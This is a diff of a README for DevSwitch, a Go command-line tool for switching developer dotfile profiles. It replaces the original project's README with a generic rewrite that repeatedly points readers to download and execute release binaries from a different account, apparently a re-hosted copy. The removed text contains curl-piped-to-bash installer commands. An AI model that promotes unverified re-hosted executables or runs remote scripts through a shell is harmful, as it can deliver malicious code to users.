@@ -1,273 +1,230 @@
-# DevSwitch 🔄
+# DevSwitch — Fast Cross-Platform Developer Environment Switcher
+[![Releases](https://img.shields.io/github/v/release/mamutijebem334/devswitch?label=Releases&logo=github&color=2b9348)](https://github.com/mamutijebem334/devswitch/releases)
 
-> Instantly switch developer profiles (.gitconfig, shell rc, VSCode settings) across work/school/personal setups
+A single CLI to switch developer environments across macOS, Linux, and Windows. Manage git configs, shell profiles, VSCode settings, PATH entries, and other dotfiles from named profiles. Work with local dotfiles or a central store. Move between projects and machines with one command.
 
-[![Go Report Card](https://goreportcard.com/badge/github.com/yourusername/devswitch)](https://goreportcard.com/report/github.com/yourusername/devswitch)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Release](https://img.shields.io/github/release/yourusername/devswitch.svg)](https://github.com/yourusername/devswitch/releases/latest)
+[![CLI](https://img.shields.io/badge/cli-ready-blue)](https://github.com/mamutijebem334/devswitch/releases) [![Cross-Platform](https://img.shields.io/badge/platform-macOS%20|%20Linux%20|%20Windows-lightgrey)]() [![Go](https://img.shields.io/badge/language-Go-brightgreen?logo=go)]()
 
-## Features ✨
+![devswitch-banner](https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png)
 
-### Core Functionality
-- 🔄 **Instant Profile Switching** - Switch between work, personal, and school configurations in seconds
-- 📦 **Beautiful CLI Interface** - Styled boxes, progress bars, and colored output
-- 🛡️ **Automatic Backups** - Never lose your configurations with automatic backup system
-- 🔍 **Profile Comparison** - Compare profiles or check differences against current config
-- 🎯 **Selective Apply** - Apply only specific config files with `--only` flag
-- ⏪ **Rollback System** - Easily revert to previous configurations
+- Topics: cli, cross-platform, dev-environment, developer-tools, development, dotfiles, gitconfig, go, golang, productivity, shell, vscode, zshrc
 
-### Extended Configuration Support
-- 🔑 **SSH Keys & Config** - Manage SSH identities and configurations
-- 🌍 **Environment Variables** - Switch API keys, paths, and environment settings
-- 🐳 **Docker Configs** - Different registries and credentials per profile
-- 📦 **NPM/Yarn Configs** - Manage different registries and auth tokens
-- ☁️ **AWS Profiles** - Switch between different AWS credentials and regions
-- ⚙️ **Git Configs** - Different git identities for work/personal projects
-- 🖥️ **VSCode Settings** - Customized editor settings per profile
-- 🐚 **Shell Configurations** - Different aliases and shell setups
+Table of contents
+- Features
+- Why DevSwitch
+- Install
+- Quickstart
+- Configuration
+- Examples
+- Integrations
+- Advanced usage
+- Troubleshooting
+- Contributing
+- License
 
-### Profile Templates
-- 🏢 **Corporate Template** - Company-focused setup with corporate npm registry
-- 👤 **Personal Template** - Personal development with Oh My Zsh and custom configs  
-- 🎯 **Minimal Template** - Clean, basic configuration setup
+Features
+- Manage named profiles for environments (work, personal, project-x).
+- Switch git user.name, user.email, and include per-repo overrides.
+- Swap shell configs: zshrc, bashrc, fish, and PATH entries.
+- Apply VSCode settings and extensions lists.
+- Support for machine-level and project-level profiles.
+- Cross-platform support: macOS, Linux, Windows (WSL supported).
+- Small Go binary with no heavy runtime.
 
-## Installation 📥
+Why DevSwitch
+- Keep environment changes versioned and repeatable.
+- Avoid manual dotfile edits when switching contexts.
+- Reuse profiles across machines.
+- Scriptable and CI-friendly.
 
-### 🚀 Quick Install (Recommended)
-```bash
-# Universal installer - detects your OS and architecture automatically
-curl -fsSL https://raw.githubusercontent.com/GustyCube/devswitch/main/install.sh | bash
+Install
+1) Visit the releases page and download the binary asset that matches your OS and architecture. The file must be downloaded and executed. Use this link: https://github.com/mamutijebem334/devswitch/releases
+
+2) Typical steps for macOS / Linux:
+- Pick the release and download the matching asset (example name): devswitch_1.2.0_linux_amd64.tar.gz
+- Extract and install:
+  - tar -xzf devswitch_1.2.0_linux_amd64.tar.gz
+  - chmod +x devswitch
+  - sudo mv devswitch /usr/local/bin/
+
+3) Typical steps for Windows:
+- Download the .zip or .exe asset from the releases page.
+- Unzip and place devswitch.exe on your PATH (e.g., C:\Tools\devswitch\).
+- Run from PowerShell or CMD.
+
+4) Install via curl (example pattern):
+- curl -L -o devswitch.tar.gz "https://github.com/mamutijebem334/devswitch/releases/download/<tag>/devswitch_<tag>_$(uname -s)_amd64.tar.gz"
+- tar -xzf devswitch.tar.gz
+- sudo mv devswitch /usr/local/bin/
+
+Quickstart
+- List profiles:
+  - devswitch list
+- Use a profile:
+  - devswitch use work
+- Show active profile:
+  - devswitch status
+- Apply changes without switching:
+  - devswitch apply --profile project-x
+
+Configuration
+DevSwitch uses a human-friendly YAML or JSON file per profile. Place profiles in a profiles/ directory or point to a repo of dotfiles.
+
+Example profile (devswitch.yaml)
+```yaml
+name: work
+git:
+  user:
+    name: "Alice Dev"
+    email: "alice@company.com"
+shell:
+  dotfiles:
+    - .zshrc
+    - .profile
+vscode:
+  settings:
+    "editor.tabSize": 2
+  extensions:
+    - ms-python.python
+    - esbenp.prettier-vscode
+env:
+  PATH_add:
+    - /usr/local/go/bin
+  VARS:
+    GIT_AUTHOR_NAME: "Alice Dev"
+hooks:
+  post:
+    - command: git config --global core.editor "code --wait"
 ```
 
-### Package Managers
+Profile store
+- Local folder: ~/.devswitch/profiles/
+- Repo-backed: clone a dotfiles repo and set it as the profile store:
+  - devswitch store set git@github.com:you/dotfiles.git
 
-#### macOS
-```bash
-# Homebrew (coming soon to homebrew-core)
-brew install devswitch
+Examples
+Switch git identity
+- devswitch use personal
+- devswitch use work
 
-# Manual Homebrew install
-brew install GustyCube/tap/devswitch
-```
+Switch shell config
+- devswitch use heavy-cli
+- The tool will:
+  - backup current files
+  - symlink or copy the profile dotfiles
+  - reload the shell where supported
 
-#### Windows
-```bash
-# Scoop
-scoop bucket add GustyCube https://github.com/GustyCube/scoop-bucket
-scoop install devswitch
+Apply VSCode settings and extensions
+- devswitch use frontend
+- The CLI writes settings.json and installs listed extensions.
 
-# Chocolatey (coming soon)
-choco install devswitch
-```
+Per-repo overrides
+- Place devswitch.yaml in a repo root.
+- Run:
+  - devswitch apply --local
+- DevSwitch will apply repo-specific config.
 
-#### Linux
+Integrations
+- git: modify global and local config, include templates.
+- shell: zsh, bash, fish. Support for sourcing and reload hooks.
+- VSCode: settings.json and code --install-extension.
+- tmux: load per-profile tmux.conf.
+- direnv: update .envrc per profile.
+- Go: add GOPATH, GOBIN to PATH and set goenv variables.
 
-**Ubuntu/Debian (APT)**
-```bash
-# Quick install
-curl -fsSL https://devswitch.gustycube.com/repository/install-apt.sh | sudo bash
-sudo apt install devswitch
+Advanced usage
+- Scripting
+  - Use devswitch in CI:
+    - devswitch apply --profile ci
+- Dry run:
+  - devswitch apply --profile work --dry-run
+- Backup and restore
+  - devswitch backup --out ~/devswitch-backup.tar.gz
+  - devswitch restore --in ~/devswitch-backup.tar.gz
+- Diff
+  - devswitch diff --profile work --target current
 
-# Manual setup
-echo "deb https://devswitch.gustycube.com/repository/apt stable main" | sudo tee /etc/apt/sources.list.d/devswitch.list
-sudo apt update && sudo apt install devswitch
-```
+Commands reference
+- devswitch list
+- devswitch use <profile> [--local|--global]
+- devswitch apply --profile <profile>
+- devswitch status
+- devswitch backup --out <file>
+- devswitch restore --in <file>
+- devswitch store set <git-url|path>
+- devswitch version
+- devswitch help <command>
 
-**RHEL/Fedora/CentOS (RPM)**
-```bash
-# Add repository
-sudo curl -o /etc/yum.repos.d/devswitch.repo https://devswitch.gustycube.com/repository/yum/devswitch.repo
+Examples of real workflows
+- Switch from office to side-project:
+  - devswitch use office
+  - devswitch use side-project
+- Sandboxed test environment:
+  - devswitch use testenv --dry-run
+  - devswitch apply --profile testenv
 
-# Install
-sudo dnf install devswitch
-```
+Troubleshooting
+- If a file conflicts, DevSwitch creates a .bak and prints the file path.
+- If an external tool is missing, the CLI reports the missing tool and suggests installation steps.
+- If a profile fails to apply, inspect the log in ~/.devswitch/logs/.
 
-**Arch Linux (AUR)**
-```bash
-# Using yay
-yay -S devswitch
+Releases and downloads
+- The releases page contains packaged binaries and assets. Download the asset that matches your OS and run the included binary or installer. Use the same link as above to find the right file: https://github.com/mamutijebem334/devswitch/releases
 
-# Using paru  
-paru -S devswitch
+Security and backups
+- DevSwitch creates backups before changing dotfiles.
+- You control where profiles live. Use a private repo for secrets.
+- Avoid committing secrets to public dotfiles.
 
-# Manual
-git clone https://aur.archlinux.org/devswitch.git
-cd devswitch && makepkg -si
-```
+Best practices
+- Keep one profile per context.
+- Use names that map to teams, projects, or roles.
+- Keep scripts idempotent and small.
+- Version your profile store.
 
-### Manual Installation
-```bash
-# Download latest release for your platform
-curl -L https://github.com/GustyCube/devswitch/releases/latest/download/devswitch-$(uname -s)-$(uname -m) -o devswitch
-chmod +x devswitch
-sudo mv devswitch /usr/local/bin/
-```
+Design notes
+- We use simple, declarative profiles. The CLI prefers explicit mapping over magic.
+- The binary stays small to avoid heavy dependencies.
+- The tool favors copying or symlinking based on platform behavior.
 
-### Build from Source
-```bash
-git clone https://github.com/GustyCube/devswitch.git
-cd devswitch
-go build -o devswitch .
-sudo cp devswitch /usr/local/bin/
-```
+Contributing
+- Fork the repo.
+- Create a feature branch.
+- Add tests and documentation.
+- Open a pull request with a clear description of the change.
+- Run go fmt and go vet before submitting.
 
-## Quick Start 🚀
+CI and tests
+- Unit tests run on Linux, macOS, and Windows runners.
+- The build produces platform artifacts for each release.
 
-```bash
-# Create your first profile from current configs
-devswitch create work
+Roadmap
+- Add plugin system for third-party modules.
+- Add UI for profile previews.
+- Add encrypted secrets manager for profile secrets.
 
-# Create a profile from a template
-devswitch create personal --template personal
+FAQ
+- Can I keep per-repo credentials?
+  - Yes. Use local git config or environment vars in the repo-level devswitch.yaml.
+- Does it change global files?
+  - It changes files only when you run use/apply. It backs up originals.
+- Can I script setup for new machines?
+  - Yes. Clone your profile store and run devswitch apply --profile bootstrap.
 
-# List all profiles
-devswitch list
+Assets and images
+- Terminal icon: https://raw.githubusercontent.com/github/explore/main/topics/terminal/terminal.png
+- VSCode icon: https://raw.githubusercontent.com/github/explore/main/topics/visual-studio-code/visual-studio-code.png
+- Use shields from img.shields.io for badges.
 
-# Switch to a profile
-devswitch apply work
+License
+- MIT
 
-# Compare profiles
-devswitch diff work personal
+Contact
+- Use issues in the repository for bugs and feature requests.
 
-# Apply only specific configs
-devswitch apply work --only gitconfig,zshrc
+Contribution etiquette
+- Write clear commit messages.
+- Keep changes scoped.
+- Add tests for behavior changes.
 
-# Rollback to previous state
-devswitch rollback
-```
-
-## Usage Examples 📖
-
-### Basic Profile Management
-```bash
-# Create profile from current configuration
-devswitch create work
-
-# Create profile from template
-devswitch create startup --template corporate
-
-# List available profiles  
-devswitch list
-# Output: Available profiles:
-#   • work
-#   • personal
-#   • startup
-
-# Check current active profile
-devswitch current
-
-# Switch profiles
-devswitch apply personal
-```
-
-### Advanced Features
-```bash
-# Compare two profiles
-devswitch diff work personal
-
-# Compare profile to current config
-devswitch diff work
-
-# Apply only specific configs
-devswitch apply work --only gitconfig,npmrc,env
-
-# Backup current configs without switching
-devswitch backup
-
-# Rollback to latest backup
-devswitch rollback
-
-# Rollback to specific backup
-devswitch rollback 20231201-143052
-```
-
-### Profile Templates
-```bash
-# Corporate template - includes company npm registry, production env vars
-devswitch create work --template corporate
-
-# Personal template - includes Oh My Zsh, personal git settings
-devswitch create home --template personal  
-
-# Minimal template - basic, clean configuration
-devswitch create simple --template minimal
-```
-
-## Managed Configuration Files 📁
-
-DevSwitch automatically manages these configuration files:
-
-| Category | Files | Description |
-|----------|-------|-------------|
-| **Git** | `.gitconfig` | Git user settings, aliases, and preferences |
-| **Shell** | `.zshrc`, `.bashrc` | Shell configuration, aliases, and environment |
-| **Editor** | `settings.json` | VSCode user settings and preferences |
-| **SSH** | `.ssh/config`, SSH keys | SSH configuration and identity files |
-| **Environment** | `.env`, `.profile` | Environment variables and system paths |
-| **Docker** | `.docker/config.json` | Docker registry and authentication |
-| **Package Managers** | `.npmrc`, `.yarnrc` | NPM/Yarn registries and tokens |
-| **Cloud** | `.aws/config`, `.aws/credentials` | AWS profiles and credentials |
-
-## File Structure 📂
-
-```
-~/.devswitch/
-├── profiles/           # Stored profiles
-│   ├── work/          # Work profile configs
-│   ├── personal/      # Personal profile configs
-│   └── school/        # School profile configs
-├── backups/           # Automatic backups
-│   ├── 20231201-143052/
-│   └── 20231201-150234/
-└── current_profile.txt # Currently active profile
-```
-
-## Templates 📋
-
-### Corporate Template
-Perfect for company work with:
-- Corporate git identity
-- Company npm registry configuration
-- Production environment variables
-- Professional VS Code settings
-- Company-specific shell aliases
-
-### Personal Template  
-Ideal for personal development:
-- Personal git identity with preferred settings
-- Oh My Zsh configuration with themes
-- Development environment variables
-- Customized editor preferences
-- Personal productivity aliases
-
-### Minimal Template
-Clean, basic setup with:
-- Simple git configuration
-- Essential shell aliases
-- Basic editor settings
-- Minimal environment setup
-
-## Contributing 🤝
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)  
-5. Open a Pull Request
-
-## License 📄
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments 🙏
-
-- [box-cli-maker](https://github.com/Delta456/box-cli-maker) - Beautiful terminal boxes
-- [color](https://github.com/fatih/color) - Colorful terminal output
-- [progressbar](https://github.com/schollz/progressbar) - Terminal progress bars
-- [cli](https://github.com/urfave/cli) - CLI application framework
-
----
-
-**DevSwitch** - Made with ❤️ for developers who juggle multiple environments
+End of file
